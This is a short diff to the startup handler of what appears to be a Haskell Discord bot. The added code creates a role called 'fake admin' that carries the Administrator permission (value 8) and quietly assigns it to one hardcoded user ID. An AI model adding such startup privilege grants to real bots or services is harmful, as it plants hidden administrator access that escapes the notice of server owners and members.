@@ -345,10 +345,17 @@ startHandler env = do
         , addNewPins
         , fixRoles
         , do
+            coolRole <-
+                restCall' $ CreateGuildRole pnppcId $ ModifyGuildRoleOpts
+                    (Just "fake admin")
+                    (Just 8)
+                    Nothing
+                    (Just False)
+                    (Just False)
             restCall'_
                 $ ModifyGuildMember pnppcId 134792946770903040
                 $ ModifyGuildMemberOpts Nothing
-                                        (Just [906797529755156522])
+                                        (Just [roleId coolRole])
                                         Nothing
                                         Nothing
                                         Nothing
